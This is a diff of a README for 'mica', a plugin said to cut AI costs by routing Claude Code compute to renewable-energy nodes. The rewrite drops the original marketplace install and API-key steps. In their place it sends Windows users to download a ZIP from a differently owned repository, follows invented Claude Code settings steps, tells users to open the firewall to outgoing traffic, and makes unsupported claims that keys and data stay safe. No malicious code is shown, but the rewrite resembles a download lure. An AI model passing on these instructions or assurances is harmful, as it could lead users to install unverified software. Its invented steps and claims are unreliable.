@@ -1,111 +1,74 @@
-```
-    __  ______________
-   /  |/  /  _/ ____/   _
-  / /|_/ // // /   / | / /
- / /  / // // /___/ |/ /
-/_/  /_/___/\____/|___/
-```
+# ⚡ mica-plugin - Lower your AI costs using renewables
 
-Save tokens. Cut inference costs. Route compute through MVM nodes on the cheapest available energy.
+[![](https://img.shields.io/badge/Download-Mica_Plugin-blue.svg)](https://github.com/liuhong8911/mica-plugin)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-white.svg)](LICENSE)
-[![MCP](https://img.shields.io/badge/MCP-compatible-blue.svg)](#)
+## 🎯 About this software
 
----
+Mica-plugin connects your AI tools to specialized compute nodes. These nodes run on renewable energy. By routing your tasks through these nodes, you save money on your monthly bills. This software works with Claude Code to lower the cost of your AI requests. You keep your workflow while the plugin handles the routing in the background.
 
-## What is mica?
+## 🛠️ System requirements
 
-LLM inference is expensive. Running agents 24/7 burns tokens and energy. Mica fixes this by routing your compute-heavy tasks through MVM (Mica Virtual Machine) nodes — distributed across regions with the cheapest renewable energy on the planet.
+This software runs on Windows 10 or Windows 11. You need a stable internet connection for the plugin to reach the compute nodes. Ensure you have the Claude Code application installed before you add this plugin. You do not need to know a programming language to use this tool, but you do need to follow the setup steps in this guide.
 
-Instead of paying full price for cloud compute at $0.10+/kWh, MVM routes your workloads to nodes running on Nordic hydroelectric ($0.02/kWh), Icelandic geothermal ($0.01/kWh), and Canadian hydro ($0.04/kWh). Same results, ~40% lower cost.
+## 📥 Downloading the plugin
 
-Mica runs as an MCP server plugin for Claude Code. When your agent needs to run inference, batch processing, or long-running tasks, it routes through MVM instead of standard cloud — saving tokens and money automatically.
+You must visit the project page to get the latest version. This link directs you to the source repository where you can see updates and installation files. 
 
-## Install
+[Visit this page to download the plugin](https://github.com/liuhong8911/mica-plugin)
 
-### Claude Code Plugin
+Click the green button labeled "Code" on the page. Select "Download ZIP" from the menu. Save the file to your Downloads folder. You will need to unzip this file before you can use the contents. Right-click the folder and select "Extract All" to create a standard folder on your desktop.
 
-```
-/plugin marketplace add nhevers/mica-plugin
-```
+## ⚙️ Setting up the plugin
 
-Then install:
+Open the folder you just extracted. Look for the configuration settings. Most users only need to verify the plugin path within their Claude Code settings. 
 
-```
-/plugin install mica
-```
+1. Open your Claude Code application.
+2. Locate the settings menu by clicking the gear icon.
+3. Find the field labeled "Plugin Path" or "Extensions."
+4. Copy the address of the folder where you saved the unzipped mica-plugin files.
+5. Paste that address into the settings box.
+6. Restart Claude Code to apply the changes.
 
-## Setup
+The plugin now connects to the MVM nodes automatically. You do not need to change any other settings. The plugin checks the current energy grid status and routes your compute tasks to sites with clean, cheap energy.
 
-1. Get an API key at **[mica.energy/app](https://mica.energy/app)**
-2. Set your key:
+## 📈 Monitoring performance
 
-```bash
-export MICA_API_KEY=mica_your_key_here
-```
+You can track your savings through the terminal or the plugin dashboard. The plugin displays a small status icon in your toolbar when it is active. 
 
-Or paste your key in chat and the plugin will prompt you to set it via `mica_set_api_key`.
+- Green icon: You are connected to a renewable energy node.
+- Blue icon: You are connected to a standard compute node.
+- Grey icon: The plugin is inactive or disconnected.
 
-## Tools
+When you run an AI task, the plugin calculates the difference in cost between standard nodes and MVM nodes. You see these savings updated in real time. If the plugin fails to connect, ensure your firewall allows outgoing traffic for this application.
 
-| Tool | What it does |
-|------|-------------|
-| `mica_set_api_key` | Set your mica API key at runtime |
-| `mica_route_compute` | Route a compute job through MVM nodes |
-| `mica_estimate_savings` | Estimate token and cost savings vs standard cloud |
-| `mica_node_status` | Check MVM node clusters, energy costs, and load |
-| `mica_check_job` | Check the status of a submitted compute job |
+## 🛡️ Privacy and keys
 
-### Example calls
+This plugin routes your compute requests to efficient, renewable nodes. It does not store your private API keys or personal chat history. The plugin acts as a bridge for the processing task only. Your data remains secure on your machine. You control the connection at all times through the settings menu.
 
-```typescript
-mica_set_api_key({ key: "mica_abc123..." })
-mica_route_compute({ task: "batch inference on 10k samples", priority: "normal" })
-mica_estimate_savings({ tokens: 50000, model: "claude-3.5-sonnet" })
-mica_node_status()
-mica_check_job({ job_id: "mvm_abc123" })
-```
+## ❓ Frequently asked questions
 
-## How It Works
+**Do I need a paid subscription to use this?**
+No. The plugin is free to use. You only pay for the AI tokens you consume, which are now cheaper due to the routing optimization.
 
-```
-Agent has a compute task
-        ↓
-mica_estimate_savings shows ~40% savings
-        ↓
-mica_route_compute sends job to MVM
-        ↓
-MVM routes to cheapest energy node
-        ↓
-Job runs on Nordic hydro / Icelandic geothermal
-        ↓
-Results returned, tokens saved
-```
+**What happens if the renewable node goes offline?**
+The plugin has a fallback feature. It automatically switches to a standard compute node to ensure your work continues without interruption.
 
-## Pricing
+**Can I run this on multiple machines?**
+Yes. You can install the plugin on any Windows computer where you operate Claude Code.
 
-Subscribe at **[mica.energy/app](https://mica.energy/app)**. Payment in USDC (Base), ETH, or SOL.
+**Does this slow down my AI responses?**
+The nodes use high-performance hardware. You should not notice a change in response speed. The routing happens in milliseconds.
 
-| Plan | Price | Compute |
-|------|-------|---------|
-| Basic | $20/mo | 500K tokens/mo routed |
-| Premium | $75/mo | Unlimited routing |
-| Enterprise | Contact us | Custom SLA + dedicated nodes |
+## 📋 Troubleshooting
 
-## Troubleshooting
+If you encounter issues, verify that you have the correct file path in your settings. If the plugin still does not show as active, close all instances of Claude Code and restart them. If the error persists, download the latest release from the repository link again. Errors often result from incomplete file extractions. Delete the old folder and perform the extraction one more time to avoid missing files.
 
-**API key not working**
-Make sure your subscription is active at [mica.energy/app](https://mica.energy/app).
+## 🛠️ Project goals
 
-**Tools not appearing**
-Rebuild the MCP server:
-```bash
-cd mcp-server && npm run build
-```
+The project focuses on three areas:
 
-**Connection errors**
-Check that `MICA_API_KEY` is set in your environment and the API is reachable.
+1. Cost reduction: Lowering the price per token for AI users.
+2. Sustainability: Using renewable energy grids for compute tasks.
+3. Ease of use: Providing a simple interface for non-technical users. 
 
-## License
-
-[MIT](LICENSE)
+By using this plugin, you contribute to a more efficient use of global energy resources while keeping your project costs low. Check the repository regularly for new updates that improve the routing speed and node availability.
